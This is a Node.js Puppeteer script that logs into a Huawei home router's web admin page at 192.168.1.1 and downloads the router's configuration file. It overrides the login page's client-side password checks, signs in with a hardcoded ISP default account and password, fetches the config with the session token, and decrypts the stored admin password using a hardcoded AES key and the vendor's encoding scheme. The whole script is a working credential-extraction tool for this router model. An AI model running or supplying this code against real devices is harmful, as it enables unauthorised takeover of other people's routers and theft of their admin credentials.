#!/usr/bin/env node
const PUPPETEER = require('puppeteer');
const fs = require('fs');
const crypto = require('crypto');
function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

const KEY_HEX = '6fc6e3436a53b6310dc09a475494ac774e7afb21b9e58fc8e58b5660e48e2498';

function HW_AES_AesEnhSysToLong(buf) {
  let out = 0, v3 = 1;
  for (let i = 0; i < 5; i++) { out += v3 * buf[i]; v3 *= 0x5D; }
  return out >>> 0;
}
function HW_AES_PlainToBin(buf) {
  if (buf.length % 5 !== 0) return null;
  const out = Buffer.alloc(buf.length * 4 / 5);
  let pos = 0;
  for (let i = 0; i < out.length; i += 4) {
    out.writeUInt32LE(HW_AES_AesEnhSysToLong(buf.slice(pos, pos+5)), i);
    pos += 5;
  }
  return out;
}
function unescapeXml(s) {
  return s.replace(/&gt;/g, '>').replace(/&lt;/g, '<').replace(/&amp;/g, '&')
    .replace(/&apos;/g, "'").replace(/&quot;/g, '"').replace(/&#(\d+);/g, (_, c) => String.fromCharCode(c));
}
function decryptHuawei(encryptedStr) {
  if (!encryptedStr.startsWith('$2') || !encryptedStr.endsWith('$')) return null;
  const trimmed = encryptedStr.substring(2, encryptedStr.length - 1);
  const buf = Buffer.from(trimmed, 'ascii');
  for (let i = 0; i < buf.length; i++) {
    if (buf[i] === 0x7e) buf[i] = 0x1e;
    else buf[i] -= 0x21;
  }
  const BLOCK_SIZE = 0x14;
  if (buf.length % BLOCK_SIZE !== 0) return null;
  const bc = Math.floor(buf.length / BLOCK_SIZE);
  const ivRaw = buf.slice(bc * BLOCK_SIZE - BLOCK_SIZE, bc * BLOCK_SIZE);
  const IV = HW_AES_PlainToBin(ivRaw);
  const dataAll = HW_AES_PlainToBin(buf.slice(0, bc * BLOCK_SIZE - BLOCK_SIZE));
  if (!dataAll || !IV) return null;
  const d = crypto.createDecipheriv('aes-256-cbc', Buffer.from(KEY_HEX, 'hex'), IV);
  d.setAutoPadding(false);
  let dec = Buffer.concat([d.update(dataAll), d.final()]);
  const pad = dec[dec.length - 1];
  if (pad > 0 && pad <= 16) dec = dec.slice(0, dec.length - pad);
  return dec.toString('utf8').replace(/\0+$/, '');
}

(async () => {
  const b = await PUPPETEER.launch({headless: true, ignoreHTTPSErrors: true, args: ['--no-sandbox', '--ignore-certificate-errors']});
  const p = await b.newPage();
  await p.goto('https://192.168.1.1/admin.html', {waitUntil: 'domcontentloaded', ignoreHTTPSErrors: true});
  await sleep(2000);
  await p.evaluate(() => { window.CheckPassword = () => 0; window.setDisable = () => {}; window.DisplayWifiPldt = () => {}; window.preflag = 0; document.querySelector('input#txt_Username').value = 'adminpldt'; document.querySelector('input#txt_Password').value = 'AC2DIU7QW3ERTY6UPAS4DFG'; });
  await sleep(500);
  await p.evaluate(() => document.getElementById('button').click());
  await sleep(5000);
  await p.goto('https://192.168.1.1/html/ssmp/cfgfile/cfgfile.asp', {waitUntil: 'domcontentloaded', ignoreHTTPSErrors: true});
  await sleep(2000);
  const tk = await p.evaluate(() => document.getElementById('hwonttoken')?.value || '');
  console.log('Token:', tk);

  let xml = await p.evaluate(async (t) => {
    try {
      const r = await fetch('/html/ssmp/cfgfile/cfgfiledown.cgi?&RequestFile=html/ssmp/cfgfile/cfgfile.asp', {
        method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'x.X_HW_Token=' + encodeURIComponent(t), credentials: 'include'
      });
      if (r.ok) return await r.text();
    } catch(e) {}
    return null;
  }, tk);
  console.log('Downloaded:', xml?.length || 'failed');

  // Extract admin password
  const m = xml.match(/UserName="admin"[^>]*?Password="([^"]+)"/);
  if (m) {
    console.log('Admin password (first 40):', m[1].substring(0, 40) + '...');
    const dec = decryptHuawei(unescapeXml(m[1]));
    console.log('Decrypted admin password:', dec);
  }
  
  // Also check PassMode
  const pm = xml.match(/UserName="admin"[^>]*?PassMode="([^"]+)"/);
  console.log('PassMode:', pm ? pm[1] : 'not found');
  
  // Save for inspection
  fs.writeFileSync('check_config.xml', xml);
  console.log('Saved to check_config.xml');

  await b.close();
})();
